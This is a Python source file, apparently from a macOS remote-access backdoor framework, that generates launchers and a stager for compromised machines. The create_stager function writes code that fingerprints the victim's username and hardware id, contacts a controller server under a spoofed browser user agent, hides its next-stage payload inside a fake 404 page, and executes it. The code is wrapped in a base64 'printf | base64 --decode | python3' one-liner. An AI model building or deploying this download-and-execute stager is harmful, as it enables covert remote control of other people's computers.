# -*- coding: utf-8 -*-
"""Creates loaders using the factory pattern."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

try:
    import imp as _imp_load
except ImportError:
    import importlib.util as _importlib
    def _load_source(name, path):
        spec = _importlib.spec_from_file_location(name, path)
        module = _importlib.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module
    _imp_load = type("imp", (), {"load_source": staticmethod(_load_source)})()
import json
import random
import string
from base64 import b64encode
from os import path, listdir
from textwrap import dedent

_module_cache = {}


def get_names():
    """:return: A list of available launchers."""
    launcher_names = []
    skip = {"__init__.py", "helper.py", "stager_py3.py"}

    for filename in listdir(path.realpath(path.dirname(__file__))):
        if not filename.endswith(".py") or filename in skip:
            continue
        launcher_names.append(filename.replace(".py", "", 1))

    # Prefer python3 first so builder default is modern-macOS-friendly.
    launcher_names.sort(key=lambda n: (0 if n == "python3" else 1, n))
    return launcher_names


def _load_module(module_name):
    """Loads the module and adds it to the cache.

    :type module_name: str
    """
    # Going to use imp over importlib until python decides to remove it.
    module_path = path.realpath(path.join(path.dirname(__file__), module_name + ".py"))
    module = _imp_load.load_source(module_name, module_path)

    _module_cache[module_name] = module

    return _module_cache[module_name]


def _get_random_user_agent():
    """
    :rtype: str
    :return: A random user agent.
    """
    # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
    ]
    return random.choice(user_agents)


def get_random_string(size=random.randint(6, 15), numbers=False):
    """
    :type size: int
    :type numbers: bool
    :rtype: str
    :return: A randomly generated string of x characters."""
    result = ""

    for i in range(0, size):
        if not numbers:
            result += random.choice(string.ascii_letters)
        else:
            result += random.choice(string.ascii_letters + string.digits)
    return result


def create_stager(server_host, server_port, loader_options):
    """
    :type server_host: str
    :type server_port: int
    :type loader_options: dict
    :rtype: str
    :return: The stager which the launcher will execute.
    """
    stager_host = "http://{}:{}".format(server_host, server_port)

    # Build session cookie payload first (avoid nested dicts inside format strings).
    session_payload = {
        "type": 0,
        "payload_options": {"host": server_host, "port": server_port},
        "loader_options": loader_options,
    }
    session_b64 = b64encode(json.dumps(session_payload).encode()).decode()
    user_agent = _get_random_user_agent()
    var_name = get_random_string()
    var_value = get_random_string(numbers=True)

    # Python 3 stager for modern macOS (no urllib2, no /usr/bin/python).
    # Keep generated code at column 0 so `base64 | python3` receives valid syntax.
    nl = chr(10)
    crnl = chr(13) + chr(10)
    stager_lines = [
        "# -*- coding: utf-8 -*-",
        "import urllib.request as _urlreq",
        "import urllib.error as _urlerr",
        "from base64 import b64encode, b64decode",
        "import getpass",
        "from uuid import getnode",
        "from binascii import hexlify",
        "",
        "",
        "def get_uid():",
        "    return hexlify((getpass.getuser() + '-' + str(getnode())).encode()).decode()",
        "",
        "",
        '{0} = "{1}"'.format(var_name, var_value),
        "data = {",
        '    "Cookie": "session=" + b64encode(get_uid().encode()).decode() + "-{0}",'.format(session_b64),
        '    "User-Agent": "{0}"'.format(user_agent),
        "}",
        "",
        "try:",
        '    request = _urlreq.Request("{0}", headers=data)'.format(stager_host),
        "    _urlreq.urlopen(request).read()",
        "except _urlerr.HTTPError as ex:",
        "    if ex.code == 404:",
        "        body = ex.read()",
        '        marker = b"DEBUG:" + bytes([10])',
        "        if marker not in body:",
        '            marker = b"DEBUG:" + bytes([13, 10])',
        '        chunk = body.split(marker, 1)[1].replace(b"DEBUG-->", b"")',
        "        exec(b64decode(chunk).decode())",
        "    else:",
        "        raise",
        "",
    ]
    stager_code = "\n".join(stager_lines)

    return "printf %s {} | base64 --decode | python3".format(b64encode(stager_code.encode()).decode())


def generate(launcher_name, stager):
    """
    :type launcher_name: str
    :type stager: str
    :return: A tuple containing the file extension and code of this launcher.
    :rtype: tuple
    """
    cached_launcher = _module_cache.get(launcher_name)

    if cached_launcher:
        return cached_launcher.Launcher().generate(stager)
    else:
        return _load_module(launcher_name).Launcher().generate(stager)


_module_cache["helper"] = _load_module("helper")
